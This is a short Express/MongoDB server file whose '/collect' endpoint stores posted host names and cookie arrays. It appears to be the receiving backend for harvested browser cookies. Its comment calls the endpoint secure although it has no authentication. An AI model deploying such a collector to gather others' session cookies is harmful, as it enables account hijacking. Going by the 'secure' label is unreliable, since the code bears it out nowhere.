import express from "express";
import mongoose from "mongoose";
import dotenv from "dotenv";

dotenv.config();

const app = express();
app.use(express.json({ limit: "10mb" }));

// ⭐ Connect to MongoDB
mongoose.connect(process.env.MONGO_URL)
    .then(() => console.log("Connected to MongoDB"))
    .catch(err => console.error(err));

// ⭐ Schema
const CookieSchema = new mongoose.Schema({
    host: String,
    cookies: Array,
    collectedAt: { type: Date, default: Date.now }
});

const CookieModel = mongoose.model("Cookie", CookieSchema);

// ⭐ Secure private endpoint
app.post("/collect", async (req, res) => {
    try {
        const { host, cookies } = req.body;

        await CookieModel.create({ host, cookies });

        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ⭐ Your local port
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Backend running on port ${PORT}`));
